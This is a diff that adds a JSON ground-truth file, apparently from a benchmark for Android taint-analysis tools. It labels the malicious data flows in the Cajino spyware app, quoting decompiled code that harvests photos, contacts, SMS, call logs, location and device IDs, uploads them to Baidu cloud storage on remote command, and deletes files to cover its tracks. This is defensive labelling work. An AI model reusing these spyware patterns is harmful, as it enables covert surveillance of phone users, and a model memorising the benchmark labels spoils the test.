@@ -1,0 +1,692 @@
+{
+  "fileName": "cajino_baidu.apk",
+  "day": "2019-04-04",
+  "findings": [
+    {
+      "source": {
+        "statement": "File[] files = new File(BaiduUtils.SDCardRoot + \"DCIM\" + File.separator + \"Camera/\").listFiles();",
+        "methodName": "public void run()",
+        "className": "ca.ji.no.method10.BaiduUtils.AnonymousClass3",
+        "lineNo": 431,
+        "targetName": "listFiles",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r5 = virtualinvoke $r2.<java.io.File: java.io.File[] listFiles()>()"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "ObjectMetadata result = (ObjectMetadata) baiduBCS.putObject(new PutObjectRequest(bucket, \"/\" + foldname + \"_\" + filename, fileContent, objectMetadata)).getResult();",
+        "methodName": "public static void putObjectByInputStream(BaiduBCS baiduBCS, String foldname, String filename)",
+        "className": "ca.ji.no.method10.BaiduUtils",
+        "lineNo": 464,
+        "targetName": "putObject",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r9 = virtualinvoke $r0.<com.baidu.inf.iis.bcs.BaiduBCS: com.baidu.inf.iis.bcs.response.BaiduBCSResponse putObject(com.baidu.inf.iis.bcs.request.PutObjectRequest)>($r6)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "String str_file = files[i].toString();",
+          "methodName": "public void run()",
+          "className": "ca.ji.no.method10.BaiduUtils.AnonymousClass3",
+          "lineNo": 434,
+          "ID": 1
+        },
+        {
+          "statement": "BaiduUtils.putObjectByInputStream(baiduBCS, deviceID + \"/photo/\", str_file.substring(str_file.lastIndexOf(\"/\") + 1));",
+          "methodName": "public void run()",
+          "className": "ca.ji.no.method10.BaiduUtils.AnonymousClass3",
+          "lineNo": 432,
+          "ID": 2
+        },
+        {
+          "statement": "File file = new File(SDCardRoot + \"DCIM\" + File.separator + \"Camera\" + File.separator + \"/\" + filename);",
+          "methodName": "public static void putObjectByInputStream(BaiduBCS baiduBCS, String foldname, String filename)",
+          "className": "ca.ji.no.method10.BaiduUtils",
+          "lineNo": 458,
+          "ID": 3
+        },
+        {
+          "statement": "InputStream fileContent = new FileInputStream(file);",
+          "methodName": "public static void putObjectByInputStream(BaiduBCS baiduBCS, String foldname, String filename)",
+          "className": "ca.ji.no.method10.BaiduUtils",
+          "lineNo": 459,
+          "ID": 4
+        }
+      ],
+      "attributes": {
+        "appendToString": true,
+        "array": true,
+        "pathConstraints": true,
+        "threading": true
+      },
+      "ID": 1,
+      "description": "This malicious flow reads photos and uploads them to a remote server via HTTP request. This malicious behavior will be triggered, when then PushMessageReceiver (a BroadcastReceiver) receives a command which contains the string 'photo'.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "String name = cursor.getString(cursor.getColumnIndex(\"display_name\"));",
+        "methodName": "public void run()",
+        "className": "ca.ji.no.method10.BaiduUtils.AnonymousClass2",
+        "lineNo": 373,
+        "targetName": "getString",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r4 = interfaceinvoke $r1.<android.database.Cursor: java.lang.String getString(int)>($i0)"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "writer.write(content);",
+        "methodName": "public static void createContactFile(String fName, String content)",
+        "className": "ca.ji.no.method10.BaiduUtils",
+        "lineNo": 479,
+        "targetName": "write",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r3.<java.io.FileWriter: void write(java.lang.String)>($r1)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "BaiduUtils.createContactFile(\"contact\", new StringBuilder(String.valueOf(name)).append(\"_\").append(number).append(\"\\n\").toString());",
+          "methodName": "public void run()",
+          "className": "ca.ji.no.method10.BaiduUtils.AnonymousClass2",
+          "lineNo": 389,
+          "ID": 1
+        },
+        {
+          "statement": "FileWriter writer = new FileWriter(SDCardRoot + \"DCIM\" + File.separator + \"Camera\" + File.separator + \"/\" + fName, true);",
+          "methodName": "public static void createContactFile(String fName, String content)",
+          "className": "ca.ji.no.method10.BaiduUtils",
+          "lineNo": 478,
+          "ID": 2
+        }
+      ],
+      "attributes": {
+        "appendToString": true,
+        "threading": true
+      },
+      "ID": 2,
+      "description": "This malicious flow reads contacts and saves them to a file. This file will be later uploaded to a remote server (not a part of this flow). This malicious behavior will be triggered, when then PushMessageReceiver (a BroadcastReceiver) receives a command which contains the string 'contact'.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "String number = cursor.getString(cursor.getColumnIndex(\"number\"));",
+        "methodName": "private static void getCallLog(Context context, String deviceID)",
+        "className": "ca.ji.no.method10.BaiduUtils",
+        "lineNo": 216,
+        "targetName": "getString",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r8 = interfaceinvoke $r12.<android.database.Cursor: java.lang.String getString(int)>($i0)"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "writer.write(content);",
+        "methodName": "public static void createContactFile(String fName, String content)",
+        "className": "ca.ji.no.method10.BaiduUtils",
+        "lineNo": 479,
+        "targetName": "write",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r3.<java.io.FileWriter: void write(java.lang.String)>($r1)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "createContactFile(\"call_log\", \"Type: \" + type + \"  Name: \" + name + \"  Num: \" + number + \"  Time: \" + time + \"  Duration: \" + cursor.getString(cursor.getColumnIndexOrThrow(\"duration\")) + \"\\n\");",
+          "methodName": "private static void getCallLog(Context context, String deviceID)",
+          "className": "ca.ji.no.method10.BaiduUtils",
+          "lineNo": 243,
+          "ID": 1
+        },
+        {
+          "statement": "FileWriter writer = new FileWriter(SDCardRoot + \"DCIM\" + File.separator + \"Camera\" + File.separator + \"/\" + fName, true);",
+          "methodName": "public static void createContactFile(String fName, String content)",
+          "className": "ca.ji.no.method10.BaiduUtils",
+          "lineNo": 478,
+          "ID": 2
+        }
+      ],
+      "attributes": {},
+      "ID": 3,
+      "description": "This malicious flow reads call log and saves them to a file. This file will be later uploaded to a remote server (not a part of this flow). This malicious behavior will be triggered, when then PushMessageReceiver (a BroadcastReceiver) receives a command which contains the string 'call_log'.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "String body = cursor.getString(1);",
+        "methodName": "private static void getMessage(Context context, final String deviceID)",
+        "className": "ca.ji.no.method10.BaiduUtils",
+        "lineNo": 323,
+        "targetName": "getString",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r5 = interfaceinvoke $r9.<android.database.Cursor: java.lang.String getString(int)>(1)"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "writer.write(content);",
+        "methodName": "public static void createContactFile(String fName, String content)",
+        "className": "ca.ji.no.method10.BaiduUtils",
+        "lineNo": 479,
+        "targetName": "write",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r3.<java.io.FileWriter: void write(java.lang.String)>($r1)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "createContactFile(\"sms\", new StringBuilder(String.valueOf(date)).append(\"_\").append(address).append(\"    \").append(body).append(\"\\n\").toString());",
+          "methodName": "private static void getMessage(Context context, final String deviceID)",
+          "className": "ca.ji.no.method10.BaiduUtils",
+          "lineNo": 326,
+          "ID": 1
+        },
+        {
+          "statement": "FileWriter writer = new FileWriter(SDCardRoot + \"DCIM\" + File.separator + \"Camera\" + File.separator + \"/\" + fName, true);",
+          "methodName": "public static void createContactFile(String fName, String content)",
+          "className": "ca.ji.no.method10.BaiduUtils",
+          "lineNo": 478,
+          "ID": 2
+        }
+      ],
+      "attributes": {
+        "appendToString": true
+      },
+      "ID": 4,
+      "description": "This malicious flow reads sms messages and saves them to a file. This file will be later uploaded to a remote server (not a part of this flow). This malicious behavior will be triggered, when then PushMessageReceiver (a BroadcastReceiver) receives a command which contains the string 'upload_message'.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "Location location = locationManager.getLastKnownLocation(locationManager.getBestProvider(criteria, true));",
+        "methodName": "private static void getLocation(Context context, String deviceID)",
+        "className": "ca.ji.no.method10.BaiduUtils",
+        "lineNo": 294,
+        "targetName": "getLastKnownLocation",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r10 = virtualinvoke $r9.<android.location.LocationManager: android.location.Location getLastKnownLocation(java.lang.String)>($r6)"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "writer.write(content);",
+        "methodName": "public static void createContactFile(String fName, String content)",
+        "className": "ca.ji.no.method10.BaiduUtils",
+        "lineNo": 479,
+        "targetName": "write",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r3.<java.io.FileWriter: void write(java.lang.String)>($r1)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "double latitude = location.getLatitude();",
+          "methodName": "private static void getLocation(Context context, String deviceID)",
+          "className": "ca.ji.no.method10.BaiduUtils",
+          "lineNo": 295,
+          "ID": 1
+        },
+        {
+          "statement": "createContactFile(\"location\", new StringBuilder(String.valueOf(latitude)).append(\" \").append(location.getLongitude()).toString());",
+          "methodName": "private static void getLocation(Context context, String deviceID)",
+          "className": "ca.ji.no.method10.BaiduUtils",
+          "lineNo": 297,
+          "ID": 2
+        },
+        {
+          "statement": "FileWriter writer = new FileWriter(SDCardRoot + \"DCIM\" + File.separator + \"Camera\" + File.separator + \"/\" + fName, true);",
+          "methodName": "public static void createContactFile(String fName, String content)",
+          "className": "ca.ji.no.method10.BaiduUtils",
+          "lineNo": 478,
+          "ID": 3
+        }
+      ],
+      "attributes": {
+        "appendToString": true
+      },
+      "ID": 5,
+      "description": "This malicious flow reads location information and saves it to a file. This file will be later uploaded to a remote server (not a part of this flow). This malicious behavior will be triggered, when then PushMessageReceiver (a BroadcastReceiver) receives a command which contains the string 'location'.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "String tmDevice = tm.getDeviceId();",
+        "methodName": "private static void getPhoneInfo(Context context)",
+        "className": "ca.ji.no.method10.BaiduUtils",
+        "lineNo": 183,
+        "targetName": "getDeviceId",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r7 = virtualinvoke $r5.<android.telephony.TelephonyManager: java.lang.String getDeviceId()>()"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "writer.write(content);",
+        "methodName": "public static void createContactFile(String fName, String content)",
+        "className": "ca.ji.no.method10.BaiduUtils",
+        "lineNo": 479,
+        "targetName": "write",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r3.<java.io.FileWriter: void write(java.lang.String)>($r1)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "createContactFile(\"PhoneInfo\", \"DevieID: \" + tmDevice + \"\\n\" + \"PhoneNumber: \" + phoneNumner + \"\\n\" + \"SIM卡序列号:\" + ss + \"\\n\" + \"电话方位:\" + tt + \"\\n\" + \"设备的软件版本号：\" + hh + \"\\n\");",
+          "methodName": "private static void getPhoneInfo(Context context)",
+          "className": "ca.ji.no.method10.BaiduUtils",
+          "lineNo": 192,
+          "ID": 1
+        }
+      ],
+      "attributes": {
+        "appendToString": true
+      },
+      "ID": 6,
+      "description": "This malicious flow reads device Id and saves it to a file. This file will be later uploaded to a remote server (not a part of this flow). This malicious behavior will be triggered, when then PushMessageReceiver (a BroadcastReceiver) receives a command which contains the string 'phone'.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "String tmDevice = tm.getDeviceId();",
+        "methodName": "private static void getPhoneInfo(Context context)",
+        "className": "ca.ji.no.method10.BaiduUtils",
+        "lineNo": 183,
+        "targetName": "getDeviceId",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r7 = virtualinvoke $r5.<android.telephony.TelephonyManager: java.lang.String getDeviceId()>()"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "ObjectMetadata result = (ObjectMetadata) baiduBCS.putObject(new PutObjectRequest(bucket, \"/\" + foldname + \"_\" + filename, fileContent, objectMetadata)).getResult();",
+        "methodName": "public static void putObjectByInputStream(BaiduBCS baiduBCS, String foldname, String filename)",
+        "className": "ca.ji.no.method10.BaiduUtils",
+        "lineNo": 464,
+        "targetName": "putObject",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r9 = virtualinvoke $r0.<com.baidu.inf.iis.bcs.BaiduBCS: com.baidu.inf.iis.bcs.response.BaiduBCSResponse putObject(com.baidu.inf.iis.bcs.request.PutObjectRequest)>($r6)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "putObjectByInputStream(baiduBCS, tmDevice, \"PhoneInfo\");",
+          "methodName": "private static void getPhoneInfo(Context context)",
+          "className": "ca.ji.no.method10.BaiduUtils",
+          "lineNo": 197,
+          "ID": 1
+        }
+      ],
+      "attributes": {},
+      "ID": 7,
+      "description": "This malicious flow reads device Id and uploads it to a remote server via HTTP request. This malicious behavior will be triggered, when then PushMessageReceiver (a BroadcastReceiver) receives a command which contains the string 'phone'.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "for (File fOrd : dir.listFiles()) {",
+        "methodName": "private static void listFileByPath(Context context, String filePath)",
+        "className": "ca.ji.no.method10.BaiduUtils",
+        "lineNo": -1,
+        "targetName": "listFiles",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r11 = virtualinvoke $r5.<java.io.File: java.io.File[] listFiles()>()"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "writer.write(content);",
+        "methodName": "public static void createContactFile(String fName, String content)",
+        "className": "ca.ji.no.method10.BaiduUtils",
+        "lineNo": 479,
+        "targetName": "write",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r3.<java.io.FileWriter: void write(java.lang.String)>($r1)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "createContactFile(\"file_list\", fOrd + \"\\n\");",
+          "methodName": "private static void listFileByPath(Context context, String filePath)",
+          "className": "ca.ji.no.method10.BaiduUtils",
+          "lineNo": 163,
+          "ID": 1
+        },
+        {
+          "statement": "FileWriter writer = new FileWriter(SDCardRoot + \"DCIM\" + File.separator + \"Camera\" + File.separator + \"/\" + fName, true);",
+          "methodName": "public static void createContactFile(String fName, String content)",
+          "className": "ca.ji.no.method10.BaiduUtils",
+          "lineNo": 478,
+          "ID": 2
+        }
+      ],
+      "attributes": {
+        "appendToString": true
+      },
+      "ID": 8,
+      "description": "This malicious flow reads file list and saves it to a file. This file will be later uploaded to a remote server (not a part of this flow). This malicious behavior will be triggered, when then PushMessageReceiver (a BroadcastReceiver) receives a command which contains the string 'list_file'.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "File file = new File(SDCardRoot + filePath);",
+        "methodName": "private static void uploadByInputStream(BaiduBCS baiduBCS, String foldname, String filePath)",
+        "className": "ca.ji.no.method10.BaiduUtils",
+        "lineNo": 133,
+        "targetName": "File",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "specialinvoke $r3.<java.io.File: void <init>(java.lang.String)>($r8)"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "ObjectMetadata result = (ObjectMetadata) baiduBCS.putObject(new PutObjectRequest(bucket, \"/\" + foldname + \"/\" + \"UploadFile\" + \"/\" + filePath, fileContent, objectMetadata)).getResult();",
+        "methodName": "private static void uploadByInputStream(BaiduBCS baiduBCS, String foldname, String filePath)",
+        "className": "ca.ji.no.method10.BaiduUtils",
+        "lineNo": 139,
+        "targetName": "putObject",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r9 = virtualinvoke $r0.<com.baidu.inf.iis.bcs.BaiduBCS: com.baidu.inf.iis.bcs.response.BaiduBCSResponse putObject(com.baidu.inf.iis.bcs.request.PutObjectRequest)>($r6)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "InputStream fileContent = new FileInputStream(file);",
+          "methodName": "private static void uploadByInputStream(BaiduBCS baiduBCS, String foldname, String filePath)",
+          "className": "ca.ji.no.method10.BaiduUtils",
+          "lineNo": 134,
+          "ID": 1
+        }
+      ],
+      "attributes": {
+        "appendToString": true
+      },
+      "ID": 9,
+      "description": "This malicious flow uploads files. This malicious behavior will be triggered, when then PushMessageReceiver (a BroadcastReceiver) receives a command which contains the string 'upload_file'.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "new File(SDCardRoot + path.substring(start + 1, path.indexOf(\")\"))).delete();",
+        "methodName": "private static void deletFileByPath(Context context, String path)",
+        "className": "ca.ji.no.method10.BaiduUtils",
+        "lineNo": 110,
+        "targetName": "File",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "specialinvoke $r2.<java.io.File: void <init>(java.lang.String)>($r1)"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "new File(SDCardRoot + path.substring(start + 1, path.indexOf(\")\"))).delete();",
+        "methodName": "private static void deletFileByPath(Context context, String path)",
+        "className": "ca.ji.no.method10.BaiduUtils",
+        "lineNo": 110,
+        "targetName": "delete",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r2.<java.io.File: boolean delete()>()"
+          }
+        ]
+      },
+      "intermediateFlows": [],
+      "attributes": {},
+      "ID": 10,
+      "description": "This malicious flow delete file. This malicious behavior will be triggered, when then PushMessageReceiver (a BroadcastReceiver) receives a command which contains the string 'delete_file'.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "targetName": "getDeviceId",
+        "targetNo": 1,
+        "statement": "String tmDevice = tm.getDeviceId();",
+        "methodName": "private static void getIt(String filePath, Context context)",
+        "className": "ca.ji.no.method10.BaiduUtils",
+        "lineNo": 72,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r4 = virtualinvoke $r7.<android.telephony.TelephonyManager: java.lang.String getDeviceId()>()"
+          }
+        ]
+      },
+      "sink": {
+        "targetName": "putObject",
+        "targetNo": 1,
+        "statement": "ObjectMetadata result = (ObjectMetadata) baiduBCS.putObject(new PutObjectRequest(bucket, \"/\" + foldname + \"_\" + filename, fileContent, objectMetadata)).getResult();",
+        "methodName": "public static void putObjectByInputStream(BaiduBCS baiduBCS, String foldname, String filename)",
+        "className": "ca.ji.no.method10.BaiduUtils",
+        "lineNo": 464,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r9 = virtualinvoke $r0.<com.baidu.inf.iis.bcs.BaiduBCS: com.baidu.inf.iis.bcs.response.BaiduBCSResponse putObject(com.baidu.inf.iis.bcs.request.PutObjectRequest)>($r6)"
+          }
+        ]
+      },
+      "intermediateFlows": [],
+      "isNegative": true,
+      "description": "Negative flow. The device id is only used as folder name.",
+      "attributes": {},
+      "ID": 11
+    },
+    {
+      "source": {
+        "targetName": "File",
+        "targetNo": 1,
+        "statement": "File file = new File(SDCardRoot + \"DCIM\" + File.separator + \"Camera\" + File.separator + \"/\" + filename);",
+        "methodName": "public static void putObjectByInputStream(BaiduBCS baiduBCS, String foldname, String filename)",
+        "className": "ca.ji.no.method10.BaiduUtils",
+        "lineNo": 458,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "specialinvoke $r3.<java.io.File: void <init>(java.lang.String)>($r8)"
+          }
+        ]
+      },
+      "sink": {
+        "targetName": "putObject",
+        "targetNo": 1,
+        "statement": "ObjectMetadata result = (ObjectMetadata) baiduBCS.putObject(new PutObjectRequest(bucket, \"/\" + foldname + \"_\" + filename, fileContent, objectMetadata)).getResult();",
+        "methodName": "public static void putObjectByInputStream(BaiduBCS baiduBCS, String foldname, String filename)",
+        "className": "ca.ji.no.method10.BaiduUtils",
+        "lineNo": 464,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r9 = virtualinvoke $r0.<com.baidu.inf.iis.bcs.BaiduBCS: com.baidu.inf.iis.bcs.response.BaiduBCSResponse putObject(com.baidu.inf.iis.bcs.request.PutObjectRequest)>($r6)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "InputStream fileContent = new FileInputStream(file);",
+          "methodName": "public static void putObjectByInputStream(BaiduBCS baiduBCS, String foldname, String filename)",
+          "className": "ca.ji.no.method10.BaiduUtils",
+          "lineNo": 459,
+          "ID": 1
+        }
+      ],
+      "isNegative": false,
+      "description": "This malicious flow uploads files to a remote server.",
+      "attributes": {},
+      "ID": 12
+    },
+    {
+      "source": {
+        "targetName": "getDeviceId",
+        "targetNo": 1,
+        "statement": "String tmDevice = tm.getDeviceId();",
+        "methodName": "private static void listFileByPath(Context context, String filePath)",
+        "className": "ca.ji.no.method10.BaiduUtils",
+        "lineNo": 147,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r1 = virtualinvoke $r9.<android.telephony.TelephonyManager: java.lang.String getDeviceId()>()"
+          }
+        ]
+      },
+      "sink": {
+        "targetName": "putObject",
+        "targetNo": 1,
+        "statement": "ObjectMetadata result = (ObjectMetadata) baiduBCS.putObject(new PutObjectRequest(bucket, \"/\" + foldname + \"_\" + filename, fileContent, objectMetadata)).getResult();",
+        "methodName": "public static void putObjectByInputStream(BaiduBCS baiduBCS, String foldname, String filename)",
+        "className": "ca.ji.no.method10.BaiduUtils",
+        "lineNo": 464,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r9 = virtualinvoke $r0.<com.baidu.inf.iis.bcs.BaiduBCS: com.baidu.inf.iis.bcs.response.BaiduBCSResponse putObject(com.baidu.inf.iis.bcs.request.PutObjectRequest)>($r6)"
+          }
+        ]
+      },
+      "intermediateFlows": [],
+      "isNegative": true,
+      "description": "Negative flow. The device id is only used as folder name.",
+      "attributes": {},
+      "ID": 13
+    },
+    {
+      "source": {
+        "targetName": "getDeviceId",
+        "targetNo": 1,
+        "statement": "String tmDevice = tm.getDeviceId();",
+        "methodName": "private static void uploadFileByPath(Context context, String path)",
+        "className": "ca.ji.no.method10.BaiduUtils",
+        "lineNo": 119,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r8 = virtualinvoke $r7.<android.telephony.TelephonyManager: java.lang.String getDeviceId()>()"
+          }
+        ]
+      },
+      "sink": {
+        "targetName": "putObject",
+        "targetNo": 1,
+        "statement": "ObjectMetadata result = (ObjectMetadata) baiduBCS.putObject(new PutObjectRequest(bucket, \"/\" + foldname + \"/\" + \"UploadFile\" + \"/\" + filePath, fileContent, objectMetadata)).getResult();",
+        "methodName": "private static void uploadByInputStream(BaiduBCS baiduBCS, String foldname, String filePath)",
+        "className": "ca.ji.no.method10.BaiduUtils",
+        "lineNo": 139,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r9 = virtualinvoke $r0.<com.baidu.inf.iis.bcs.BaiduBCS: com.baidu.inf.iis.bcs.response.BaiduBCSResponse putObject(com.baidu.inf.iis.bcs.request.PutObjectRequest)>($r6)"
+          }
+        ]
+      },
+      "intermediateFlows": [],
+      "isNegative": true,
+      "description": "Negative flow. The device id is only used as folder name.",
+      "attributes": {},
+      "ID": 14
+    },
+    {
+      "source": {
+        "targetName": "File",
+        "targetNo": 1,
+        "statement": "new File(SDCardRoot + \"DCIM\" + File.separator + \"Camera\" + File.separator + \"/\" + path).delete();",
+        "methodName": "public static void deletTempFile(String path)",
+        "className": "ca.ji.no.method10.BaiduUtils",
+        "lineNo": 470,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "specialinvoke $r1.<java.io.File: void <init>(java.lang.String)>($r0)"
+          }
+        ]
+      },
+      "sink": {
+        "targetName": "delete",
+        "targetNo": 1,
+        "statement": "new File(SDCardRoot + \"DCIM\" + File.separator + \"Camera\" + File.separator + \"/\" + path).delete();",
+        "methodName": "public static void deletTempFile(String path)",
+        "className": "ca.ji.no.method10.BaiduUtils",
+        "lineNo": 470,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r1.<java.io.File: boolean delete()>()"
+          }
+        ]
+      },
+      "intermediateFlows": [],
+      "description": "This malicious flow deletes files to cover up the malicious behaviors. ",
+      "isNegative": false,
+      "attributes": {},
+      "ID": 15
+    }
+  ]
+}
